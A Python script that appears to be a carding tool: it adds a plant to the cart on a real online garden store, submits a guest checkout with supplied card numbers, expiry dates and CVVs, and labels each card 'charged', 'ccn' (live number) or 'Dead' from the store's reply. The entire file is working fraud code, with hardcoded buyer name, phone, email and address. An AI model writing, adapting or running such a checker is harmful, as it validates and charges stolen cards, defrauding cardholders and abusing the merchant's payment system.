from utilsdf.functions import  capture
from httpx import AsyncClient
import asyncio, sys


async def darkito(cc, month, year, cvv):

    async with AsyncClient(
        follow_redirects=True, verify=False,
    ) as session:
        r = await session.get(
            "https://www.gardenerdirect.com/buy-plants/131/Aspidistra-Cast-Iron-Plants/Cast-Iron-Plant",
        )

        h2 = {
            "Host": "www.gardenerdirect.com",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.gardenerdirect.com",
            "Referer": "https://www.gardenerdirect.com/buy-plants/131/Aspidistra-Cast-Iron-Plants/Cast-Iron-Plant",
        }

        p2 = "pid=133&poid=131&quantity=1"

        r2 = await session.post(
            "https://www.gardenerdirect.com/json/cart/add.json.php",
            headers=h2,
            data=p2,
        )

        h3 = {
            "Host": "www.gardenerdirect.com",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "Origin": "https://www.gardenerdirect.com",
            "Referer": "https://www.gardenerdirect.com/checkout/guest/",
        }

        p3 = f"firstname=Sachio&lastname=YT&phone=190-063-1864&email=sachiopremiun%40gmail.com&shiptostreet1=118+W+132nd+St&shiptocity=New+York&shiptoregionid=154&shiptopostalcode=10027&shiptocountryid=254&isprimary=0&ordernotes=&paymenttypeid=1&nameoncard=Sachio+YT&creditcardnumber={cc}&creditcardtypeid=2&expirationmonth={month}&expirationyear={year}&securitycode={cvv}&billtostreet=118+W+132nd+St&billtocity=New+York&billtoregionid=154&billtopostalcode=10027&billtocountryid=254"

        await asyncio.sleep(4)

        r3 = await session.post(
            "https://www.gardenerdirect.com/json/checkout/checkoutGuestComplete.json.php",
            headers=h3,
            data=p3,
            timeout=5,
        )
        t3 = r3.text
        msg = capture(t3, '"message":"', '"')

        if msg == "Order completed successfully!":
            status = "Approved! ✅ -» charged!"
            msg = "Order completed successfully! -» $28.57"
        elif (
            msg
            == "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number."
        ):
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        sys.stdout.flush()

        return status, msg
